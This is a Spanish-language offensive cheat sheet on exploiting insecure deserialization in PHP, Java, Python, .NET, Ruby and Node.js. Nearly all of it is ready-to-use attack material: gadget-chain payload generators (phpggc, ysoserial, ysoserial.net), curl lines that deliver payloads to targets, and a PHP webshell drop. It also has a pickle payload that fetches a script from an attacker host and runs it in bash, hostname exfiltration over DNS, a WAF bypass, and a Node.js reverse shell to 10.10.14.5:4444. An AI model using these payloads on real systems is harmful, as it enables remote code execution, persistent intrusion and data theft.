---
aliases:
  - Object Injection
  - POP Chains
  - Deserialization Gadgets
  - Magic Method Abuse
tags:
  - type/technique
  - vuln/insecure-deser
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Insecure Deserialization]]'
---
# Insecure Deserialization - Object Injection

***

## PHP

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `phpggc Monolog/RCE1 system "id"` | Forge serialized payload con gadget chain Monolog → RCE | App con Monolog en classpath. |
| `phpggc Laravel/RCE9 system "id"` | Laravel gadget chain RCE | Laravel app. |
| `phpggc WordPress/RCE1 system "id"` | WordPress gadget chain RCE | WP plugin / theme deser. |
| `phpggc Symfony/RCE1 system "id"` | Symfony gadget chain | Symfony app. |
| `phpggc Guzzle/FW1 /var/www/html/sh.php '<?=\`$_GET[c]\`?>'` | Webshell drop via Guzzle file write gadget | Persistencia. |
| `phpggc -b Monolog/RCE1 system "id"` | Output base64 ready para inject | Cookie/header transport. |
| `phpggc -u Monolog/RCE1 system "id"` | URL-encoded output | Inyección en GET param. |
| `phpggc -p phar -pj img.jpg Monolog/RCE1 system "id" -o evil.phar` | Phar polyglot — LFI + Phar trigger | Combo file upload + LFI. |
| `curl -b "user=$(phpggc -b Monolog/RCE1 system 'id')" https://target/` | Trigger via cookie | App con `unserialize($_COOKIE['user'])`. |
| `curl -d "data=$(phpggc -u Monolog/RCE1 system 'id')" https://target/` | Trigger via POST body | App con `unserialize($_POST['data'])`. |
| `O:4:"User":2:{...una sola prop...}` (count incorrecto) | Bypass `__wakeup` (CVE-2016-7124) | PHP < 5.6.25 / 7.0.10. |
^deser-php

### Ejemplo POP chain manual

```php
class Logger {
    public $log_file;
    public $log_data;
    function __destruct() {
        file_put_contents($this->log_file, $this->log_data);
    }
}

$obj = new Logger();
$obj->log_file = "/var/www/html/sh.php";
$obj->log_data = '<?=`$_GET[c]`?>';

echo serialize($obj);
// O:6:"Logger":2:{s:8:"log_file";s:23:"/var/www/html/sh.php";s:8:"log_data";s:15:"<?=`$_GET[c]`?>";}
```

___

## Java

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/" \| base64 -w0` | Canary payload — confirma deser activa sin RCE | Initial probe. |
| `java -jar ysoserial-all.jar CommonsCollections5 "id" > rce.bin` | Apache Commons Collections RCE | Commons Collections en classpath. |
| `java -jar ysoserial-all.jar CommonsBeanutils1 "id"` | Commons Beanutils gadget | Spring + Beanutils. |
| `java -jar ysoserial-all.jar Spring1 "id"` | Spring framework gadget | Spring core. |
| `java -jar ysoserial-all.jar Hibernate1 "id"` | Hibernate ORM gadget | Apps con Hibernate. |
| `java -jar ysoserial-all.jar JBossInterceptors1 "id"` | JBoss EAP gadget | JBoss stack. |
| `java -jar ysoserial-all.jar Groovy1 "id"` | Groovy en classpath gadget | Groovy lib presente. |
| `curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @rce.bin https://target/api/deser` | Direct POST raw binary | RMI / JMX endpoints. |
| `gzip -c rce.bin \| base64 -w0 \| curl -d @- https://target/api/x` | Wrap gzip + base64 → bypass WAF que filtra `aced0005` | WAF magic bytes filter. |
| `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/$(hostname)"` | Canary con host info exfil | Blind detection + recon. |
^deser-java

### Workflow Java

```bash
# 1. Probe con URLDNS (canary)
PAYLOAD=$(java -jar ysoserial.jar URLDNS "http://abc123.oast.fun/" | base64 -w0)
curl -X POST -H "Content-Type: application/x-java-serialized-object" \
  --data-binary "@<(echo $PAYLOAD | base64 -d)" https://target/api/deser

# 2. Si DNS query llega → confirmado. Probar gadget RCE
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker/x" \
  | base64 -w0 > rce.b64

# 3. Inyectar (depende del transport)
curl -X POST --data-binary "@<(base64 -d rce.b64)" https://target/api
```

___

## Python

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 -c "import pickle,os,base64; class E:\n def __reduce__(s): return (os.system,('id',))\nprint(base64.b64encode(pickle.dumps(E())).decode())"` | Forge payload pickle base64 con __reduce__ | Backend con pickle deser. |
| `fickling --create 'os.system(\"id\")' evil.pkl` | Crear archivo pickle malicioso | Sin Python script custom. |
| `fickling --inject 'os.system(\"id\")' benign.pkl > evil.pkl` | Inyectar código en archivo pickle existente | ML model file vector. |
| `fickling --check evil.pkl` | Análisis estático — verifica opcodes peligrosos sin ejecutar | Audit pre-attack. |
| `curl -X POST -H "Cookie: user=$PAYLOAD_B64" https://target/` | Trigger via cookie | Cookie deser. |
| `curl -X POST --data-binary "@evil.pkl" https://target/api/load` | Direct POST archivo binario | API que carga pickle. |
| Upload `.pkl` o `.joblib` malicioso a endpoint que carga ML model | RCE via ML model load | App con `joblib.load()` o `pandas.read_pickle()`. |
| `python3 -c "import yaml; yaml.load('!!python/object/apply:os.system [\"id\"]', Loader=yaml.Loader)"` | Test YAML.load RCE local | Backend con `yaml.load()`. |
^deser-python

### Payload Python mínimo

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/x | bash',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
# gASVNAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1jdXJsIGh0dHA6Ly9hdHRhY2tlci94IHwgYmFzaJSFlFKULg==
```

___

## .NET

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ysoserial.net.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | RCE via TextFormattingRunProperties + BinaryFormatter | Default reliable .NET. |
| `ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` | Bypass type filters via TypeConfuseDelegate | Filtros de tipo. |
| `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` | RCE via JSON.NET + TypeNameHandling | Newtonsoft.Json con TypeNameHandling. |
| `ysoserial.net.exe -g WindowsClaimsIdentity -f BinaryFormatter -c "calc"` | .NET 4.7+ specific gadget | Modern .NET. |
| `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --apppath="/"` | ViewState exploit (sin MAC) | ASP.NET con MAC desactivado. |
| `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --validationkey="HEX" --validationalg="SHA1" --decryptionkey="HEX" --decryptionalg="AES"` | ViewState exploit con keys del web.config | Keys leaked / IIS short URL. |
| `curl -X POST -d "__VIEWSTATE=$PAYLOAD" https://target/page.aspx` | Trigger ViewState payload via POST | ASP.NET endpoint. |
| `curl -X POST -H "Content-Type: application/json" -d '{"$type":"System.IO.FileInfo, mscorlib","fileName":"path"}' https://target/api/deser` | Direct JSON.NET TypeNameHandling abuse | TypeNameHandling=All. |
^deser-dotnet

### ViewState exploit completo

```bash
# 1. Extraer ViewState validation key (si tenés acceso a web.config)
grep -E 'validationKey|decryptionKey' web.config

# 2. Generar payload
ysoserial.net.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc <b64-payload>" \
  --path="/page.aspx" \
  --apppath="/" \
  --validationkey="<hex>" \
  --validationalg="SHA1" \
  --decryptionkey="<hex>" \
  --decryptionalg="AES"

# 3. POST __VIEWSTATE field
curl -X POST -d "__VIEWSTATE=<payload>" https://target/page.aspx
```

___

## Ruby

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ruby -e "require 'erb'; puts Marshal.dump(ERB.new('<%= \`id\` %>'))"` | Forge Marshal payload con ERB injection | App con `Marshal.load()`. |
| `curl -b "session=$(ruby -e '...' \| base64 -w0)" https://target/` | Cookie Marshal trigger | Sinatra/Rails session cookie. |
| `curl -X POST -d "$(cat universalrxss.yml)" https://target/api/yaml` | Universal Ruby gadget YAML (CVE-2013-0156) | Rails legacy. |
| `curl -X POST -H "Content-Type: application/x-yaml" --data-binary "$(cat payload.yml)" https://target/` | YAML.load RCE | Rails con YAML deser. |
| Upload `.yml` con `--- !ruby/object:ERB src: ...` | YAML deser via file upload | App carga YAML files. |
^deser-ruby

### Payload Ruby YAML clásico

```yaml
--- !ruby/object:ERB
src: !ruby/object:OpenStruct
  table:
    :result: !ruby/object:Gem::Requirement
      requirements:
        !ruby/object:Gem::Package::TarReader
        io: !ruby/object:Gem::Package::TarReader::Entry
          io:
            !ruby/object:StringIO
            string: ""
          read: 1
filename: " | id"
```

(Universal Ruby gadget — varía por versión.)

___

## Node.js

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `node -e "const s=require('node-serialize'); console.log(s.serialize({rce:function(){...gadget...}}))"` luego agregar `()` al final del IIFE | Forge IIFE payload Node | `node-serialize` ≤ 0.0.4. |
| `curl -X POST -H "Content-Type: application/json" -d '{"profile":"_$$ND_FUNC$$_function(){<gadget>}()"}' https://target/api/x` | Inject IIFE via JSON | Backend `serialize.unserialize(req.body)`. |
| `curl -b "profile=_\$\$ND_FUNC\$\$_function()<gadget>()" https://target/` | Cookie-based Node deser | Cookie parser + node-serialize. |
| `npm audit \| grep -E 'serialize-to-js\|node-serialize\|funcster'` | Audit dependencies | Pre-attack discovery. |
| Combine con prototype pollution: `{"__proto__":{"polluted":"yes"}}` post-deser RCE | Multi-vector chain | Stack vulnerable a both. |
^deser-node

### Payload Node.js completo

```javascript
// Generador
const serialize = require('node-serialize');
const obj = {
  rce: function() {
    require('child_process').exec(
      'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"',
      function(err, stdout) { console.log(stdout); }
    );
  }
};
const payload = serialize.serialize(obj);
// Resultado:
// {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec(...)}"}
```

Para forzar ejecución, agregar `()` al final del IIFE:
```
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()"}
```

***
